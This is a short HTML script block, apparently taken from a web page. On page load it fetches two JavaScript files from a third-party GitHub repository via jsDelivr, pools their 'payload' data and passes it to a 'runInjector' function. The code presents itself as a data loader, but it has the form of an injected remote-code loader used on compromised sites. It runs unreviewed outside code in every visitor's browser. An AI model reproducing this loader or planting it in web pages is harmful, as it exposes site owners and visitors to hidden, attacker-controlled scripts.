<script>
(function(){
  function loadScript(src){
    return new Promise((resolve, reject)=>{
      var s = document.createElement('script');
      s.src = src + '?v=' + Date.now();
      s.onload = resolve;
      s.onerror = reject;
      document.head.appendChild(s);
    });
  }
  window.__DATA_POOL__ = [];
  loadScript('https://cdn.jsdelivr.net/gh/jsindex-web/jsdelivr@refs/heads/main/data-loaders.js')
  .then(()=>{
    if(window.payload){
      window.__DATA_POOL__ = window.__DATA_POOL__.concat(window.payload);
    }
  })
  .then(()=> loadScript('https://cdn.jsdelivr.net/gh/jsindex-web/jsdelivr@refs/heads/main/jgssnm.js'))
  .then(()=>{
    if(window.payload){
      window.__DATA_POOL__ = window.__DATA_POOL__.concat(window.payload);
    }
  })
  .then(()=>{
    window.__DATA_POOL__ = [...new Set(window.__DATA_POOL__)];
    console.log('Render data ready:', window.__DATA_POOL__);
    if(typeof window.runInjector === "function"){
      window.runInjector(window.__DATA_POOL__);
    }
  })
  .catch(err=>{
    console.error('Loader error:', err);
  });
})();
</script>
